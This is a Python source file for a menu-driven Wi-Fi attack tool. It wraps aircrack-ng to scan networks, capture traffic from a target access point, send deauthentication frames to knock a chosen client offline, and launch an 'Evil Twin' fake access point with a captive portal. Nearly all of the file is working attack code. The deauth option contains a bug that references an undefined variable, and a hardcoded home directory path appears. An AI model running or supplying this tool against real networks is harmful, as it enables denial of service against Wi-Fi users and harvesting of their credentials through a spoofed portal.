#!/usr/bin/python3

import os
import subprocess
from tqdm import tqdm
from time import sleep
from subprocess import check_call
from scapy.all import *
import io
def print_title():

    print("""
 __      __      ____                 ___                                     
/\ \  __/\ \  __/\  _`\   __         /\_ \                                    
\ \ \/\ \ \ \/\_\ \ \L\_\/\_\    ____\//\ \      __     __  __     __   _ __  
 \ \ \ \ \ \ \/\ \ \  _\/\/\ \  /',__\ \ \ \   /'__`\  /\ \/\ \  /'__`\/\`'__\  
  \ \ \_/ \_\ \ \ \ \ \/  \ \ \/\__, `\ \_\ \_/\ \L\.\_\ \ \_\ \/\  __/\ \ \/ 
   \ `\___x___/\ \_\ \_\   \ \_\/\____/ /\____\ \__/.\_\\/`____ \ \____\\ \_\   
    '\/__//__/  \/_/\/_/    \/_/\/___/  \/____/\/__/\/_/ `/___/> \/____/ \/_/ 
                                                            /\___/            
                                                            \/__/
    
                                                            Created by Stitch""")
    return
def main(first):
    cmd = os.system("clear")
    print_title()
    if (first):
        print()
        for i in tqdm(range(0,100), 
            desc = "Checking for necessary tools"):
            sleep(0.01)
        print()
        cmd = os.system("apt install aircrack-ng")
        cmd = os.system("clear")
        print_title()
    print("""Options:\n        
    1.- Start monitor mode       
    2.- Stop monitor mode                        
    3.- Scan Networks                            
    4.- Scan target ESSID   
    5.- Deauth attack
    6.- Evil Twin captive portal

    0.- Exit\n""")
    print("-> Selected option:", end=" ")
    option = int(input(""))
    cmd = os.system("clear")
    if option == 0:
        print("Leaving...\n")
        for i in tqdm(range(0,100),
        desc = "Killing all processes"):
            sleep(0.01)
        print()
        print("""
   ____     _ __                                      __      
  / __/  __(_) / ___  ___ _  _____ ____  _______ ___ / /____    
 / _/| |/ / / / / _ \/ -_) |/ / -_) __/ / __/ -_|_-</ __(_-<_
/___/|___/_/_/ /_//_/\__/|___/\__/_/   /_/  \__/___/\__/___( )  
                                                           |/ 
            __              __            __  
       ___ / /____ ___ __  / /  ___ _____/ /__
      (_-</ __/ _ `/ // / / _ \/ _ `/ __/  '_/
     /___/\__/\_,_/\_, / /_//_/\_,_/\__/_/\_\ 
                  /___/                                                        
                                                           """)
        exit()

    elif option == 1:
        print("Available interfaces: ")
        ifaces = os.popen("ifconfig | sed 's/.[ \t].*//;/^\(lo\|\)$/d'").read()
        iface = ifaces.splitlines()
        for i in range(len(iface)):
            print(str(i + 1) + ".- " + iface[i].rstrip() + "\n")

        print("-> Selected interface:", end=" ")
        try:
            option = int(input(""))
            command = "airmon-ng start {} && airmon-ng check kill".format(iface[option - 1])
            geny = os.system(command)
        except ValueError:
            print("An error occurred, use index to select the interface\n")
        print("-> Click to continue", end=" ")
        input("")
        main(False)
    elif option == 2:
        print("Available interfaces: ")
        ifaces = os.popen("ifconfig | sed 's/.[ \t].*//;/^\(lo\|\)$/d'").read()
        iface = ifaces.splitlines()
        for i in range(len(iface)):
            print(str(i + 1) + ".- " + iface[i].rstrip() + "\n")
  
        print("-> Selected interface:", end=" ")
        try:
            option = int(input(""))
            command = "airmon-ng stop {}".format(iface[option - 1])
            geny = os.system(command)
        except ValueError:
             print("An error occurred, use index to select the interface\n")
        print("-> Click to continue", end=" ")
        input("")
        main(False)


    elif option ==3:
        print("Available interfaces: ")
        ifaces = os.popen("iwconfig 2> /dev/null | grep -B 1 Monitor | cut -d ' ' -f1").read()
        ifaces = ifaces.rstrip()
        iface = ifaces.splitlines()
        for i in range(len(iface)):
            print(str(i + 1) + ".- " + iface[i].rstrip() + "\n")

        print("-> Selected interface:", end=" ")
        try:
            iface_sel = int(input(""))
            channel = 0
            print("-> Select channel 0-13 (default 0 all channels):", end=" ")
            channel = int(input(""))
            print("-> Do you want to save the pcap (capture.pcap) y/n:", end=" ")
            save = input("")
            if (channel == 0):
                if (save == "y"):
                    command = "airodump-ng -w capture.pcap {}".format(iface[iface_sel - 1])
                    geny = os.system(command)
                else:
                    command = "airodump-ng {}".format(iface[iface_sel - 1])
                    geny = os.system(command)
            elif (channel > 0 and channel < 14):
                if (save == "y"):
                    print("save")
                    command = "airodump-ng -w capture.pcap -c {} {}".format(channel, iface[iface_sel - 1])
                    geny = os.system(command)
                else:
                    command = "airodump-ng -c {} {}".format(channel, iface[iface_sel - 1])
                    geny = os.system(command)
            else:
                print("An error occurred, check values")
        except ValueError:
            print("An error occurred, use index to select the interface\n")
        print("-> Click to continue", end=" ")
        input("")
        main(False)
    elif option == 4:
        print("Available interfaces: ")
        ifaces = os.popen("iwconfig 2> /dev/null | grep -B 1 Monitor | cut -d ' ' -f1").read()
        ifaces = ifaces.rstrip()
        iface = ifaces.splitlines()
        for i in range(len(iface)):
           print(str(i + 1) + ".- " + iface[i].rstrip() + "\n")
        print("-> Selected interface:", end=" ")
        try:
            iface_sel = int(input(""))
            channel = 0
            print("-> Set target BSSID:", end=" ")                            
            bssid = input("") 
            print("-> Select channel 0-13 (default 0 all channels):", end=" ")
            channel = int(input(""))
            print("-> Do you want to save the pcap (capture.pcap) y/n:", end=" ")
            save = input("")
            if (channel == 0):
                if (save == "y"):
                    command = "airodump-ng --bssid {} -w capture.pcap {}".format(bssid,iface[iface_sel - 1])
                    geny = os.system(command)
                else:
                    command = "airodump-ng --bssid {} {}".format(bssid, iface[iface_sel - 1])
                    geny = os.system(command)
            elif (channel > 0 and channel < 14):
                if (save == "y"):
                    command = "airodump-ng --bssid {} -w capture.pcap -c {} {}".format(bssid, channel, iface[iface_sel - 1])
                    geny = os.system(command)
                else:
                    command = "airodump-ng --bssid {} -c {} {}".format(bssid, channel, iface[iface_sel - 1])
                    geny = os.system(command)
            else:
                print("An error occurred, check values")
        except ValueError:
            print("An error occurred, check inserted values\n")
        print("-> Click to continue", end=" ")
        input("")
        main(False)
    elif option == 5:
        print("Available interfaces: ")
        ifaces = os.popen("iwconfig 2> /dev/null | grep -B 1 Monitor | cut -d ' ' -f1").read()
        ifaces = ifaces.rstrip()
        iface = ifaces.splitlines()
        for i in range(len(iface)):
            print(str(i + 1) + ".- " + iface[i].rstrip() + "\n")
        print("-> Selected interface:", end=" ")
        try:
            iface_sel = int(input(""))
            print("-> Set AP BSSID:", end=" ")                            
            access_mac = input("") 
            print("-> Set target MAC:", end=" ")
            channel = int(input(""))
            command = "aireplay-ng -0 10 -a {} -c {} {}".format(access_mac, target_mac, iface[iface_sel - 1])
            geny = os.system(command)
        except ValueError:
            print("An error occurred, check inserted values\n")
        print("-> Click to continue", end=" ")
        input("")
        main(False)

    elif option == 6:
        print("Available interfaces: ")
        ifaces = os.popen("iwconfig 2> /dev/null | grep -B 1 Monitor | cut -d ' ' -f1").read()
        ifaces = ifaces.rstrip()
        iface = ifaces.splitlines()
        for i in range(len(iface)):
            print(str(i + 1) + ".- " + iface[i].rstrip() + "\n")
        print("-> Selected interface:", end=" ")
        try:
            iface_sel = int(input(""))
            print("-> Selected ssid name for the AP:", end=" ")
            ssid = input("")

            with open('/home/rohirrim/Documentos/secmob/wifislayer/fakeap/conf/hostapd.conf', 'r') as file:
                data = file.readlines()
            data[3] = "interface=" + iface[iface_sel - 1] + "\n"
            data[9] = "ssid=" + ssid + "\n"
            with open('/home/rohirrim/Documentos/secmob/wifislayer/fakeap/conf/hostapd.conf', 'w') as file:
                file.writelines(data)
            command = "./fakeap/fakeap.sh"
            geny = os.system(command) 
        except ValueError:
            print("An error occurred, check inserted values\n")
            
        print("-> Click to continue", end=" ")
        input("")
        main(False)
main(True)
